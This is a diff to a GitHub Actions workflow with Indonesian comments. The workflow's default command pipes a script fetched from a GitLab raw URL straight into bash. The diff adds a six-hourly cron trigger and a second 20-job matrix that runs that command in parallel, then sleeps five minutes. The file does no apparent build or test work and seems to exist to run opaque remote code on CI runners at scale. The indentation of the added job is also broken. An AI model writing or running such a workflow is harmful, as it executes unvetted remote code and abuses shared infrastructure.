@@ -7,6 +7,8 @@ on:
         description: 'Perintah yang akan dijalankan di job hert'
         required: false
         default: 'curl -sL https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/var999 | bash'
+  schedule:
+    - cron: '0 */6 * * *'   # setiap 6 jam
 
 jobs:
   hert:
@@ -21,15 +23,30 @@ jobs:
         continue-on-error: true
         run: echo hert
 
-  bert:
+  nert:
+    needs: [hert]
+    runs-on: ubuntu-latest
+    strategy:
+    fail-fast: false
+    matrix:
+      build: [C.1, D.1]
+      flag: [A, B, C, D, E, F, G, H, I, J]
+  steps:
+    - name: Jalankan perintah
+      continue-on-error: true
+      run: ${{ github.event.inputs.command }}
+    - name: okes
+      run: sleep 300   # 300 detik = 5 menit
+
+  dert:
     needs: [hert]
     runs-on: ubuntu-latest
     strategy:
       fail-fast: false
       matrix:
-        build: [C.1, D.1]
+        build: [E.1, F.1]
         flag: [A, B, C, D, E, F, G, H, I, J]
     steps:
-      - name: Jalankan 
+      - name: dertjob
         continue-on-error: true
-        run: ${{ github.event.inputs.command }}
+        run: ${{ github.event.inputs.command }}      
